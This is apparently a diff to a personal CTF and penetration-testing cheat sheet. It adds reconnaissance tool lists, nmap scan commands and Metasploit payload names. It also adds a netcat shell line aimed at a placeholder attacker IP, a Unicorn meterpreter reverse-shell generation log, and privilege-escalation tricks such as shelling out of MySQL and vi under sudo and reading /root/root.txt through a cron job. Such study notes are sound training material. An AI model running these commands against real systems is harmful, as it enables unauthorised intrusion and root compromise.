@@ -111,6 +111,56 @@ tags:
 * If SMB is open, we can use the following command to try connecting
   * `smbclient -L \\\\<HOST_IP>`
 
+# Web Hacking
+* 5 Stages of Hacking
+  * Reconnaissance
+  * Scanning and Enumeration
+  * Gaining Access
+  * Maintaining Access
+  * Covering Tracks
+  
+### RECONNAISSANCE
+#### TOOLS:
+* Whois
+* Nslookup
+* dnsrecon
+* Google Fu
+* dig
+* [Sublist3r](https://github.com/aboul3la/Sublist3r)
+* Bluto
+* [crt.sh](http://crt.sh)
+* [Hunter.io](https://hunter.io/)  -- Gather Email about a Company
+* Fingerprinting
+  * Nmap 
+  * Wappalyzer
+  * Whatweb
+  * Builtwith
+  * Netcat
+* Data breaches
+  * HaveIbeenPwned
+  * `pip install bluto` -- Tool to gather Information Recon
+* Use foxy Proxy Firefox adddon for switching for Burp Suite
+* Use scope filter with this filter `.*\.irobot\.com$`
+* Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
+* Use Zap Proxy tool to extract hidden files/directories.
+* Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
+* `theharvester -d microsoft.com -l 200 -g -b google` Gather Information
+
+### SCANNING
+* `nmap -sn <NETWORK>` -- Ping Sweep
+* `nmap -T4 <NETWORK>` -- SYN Scan with Speed of 4 and port of common 1000 TCP
+* `nmap -T4 -A -p- <NETWORK>` -- All Port scan with All Scanning including OS, Version, Script and Traceroute
+* `nmap -sU -T4 <NETWORK>` -- UDP Ports, Dont scan all scans, as it takes lot of time.
+
+
+### Payloads
+* `windows/meterpreter_reverse_tcp` is Non Staged Payload
+* `windows/meterpreter/reverse_tcp` is  Staged Payload
+
+### SHELL
+* Reverse Shell
+* Bind Shell : `nc <ATTACKER_IP> <ATTACKET_PORT>`, to listen : `nc -lvp <ATTACKER_PORT>`
+
 # File Hacking
 * If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
    * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
@@ -207,7 +257,7 @@ tags:
   id
   uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
   ```
-  * To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
+* To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
   ```
   root# /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
   [*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
@@ -215,12 +265,12 @@ tags:
   [*] Started reverse TCP handler on <HOST_IP>:3333 
   msf5 exploit(multi/handler) >         
   ```
-  * Get Shell from MYSQL
+* Get Shell from MYSQL
   ```
   mysql> \! /bin/sh
   ```
   
-  * To get Root from VI
+* To get Root from VI
   ```
   www-data@enemy:$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
   ```
@@ -229,8 +279,21 @@ tags:
   www-data@enemy:$ sudo /usr/bin/vi /var/www/html/anyrandomFile
   Type Escape and enter :!/bin/bash
   ```
-  * Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc
-
+* Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc.
+* If some system cron is getting some url present in the file, we can replace url to get flag as below.
+  ```
+  root@kali:~/admin-area$ cat input 
+  url = "file:///root/root.txt"
+  ```
+* Lot of Privilige Exec Depends on Cronjobs and to monitor use, we can tail the logs for sometime to observe the actions.
+  ```
+  sun@kali:~/Documents$ tail -f /var/log/syslog
+  Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+  Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+  Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
+  Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+  ```
+  
 # Tools
 * Reconnoitre [Links](https://github.com/codingo/Reconnoitre) -- A security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
    * `reconnoitre -t 10.10.10.37 -o `pwd` --services`
@@ -242,6 +305,9 @@ tags:
 * [Nmap Automator](https://github.com/21y4d/nmapAutomator)
 * 7z Password Cracking: Use tool `7z2john`
 * SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
+* [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
+* [GDB Peda](https://github.com/longld/peda)
+* [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
 
 ***
 
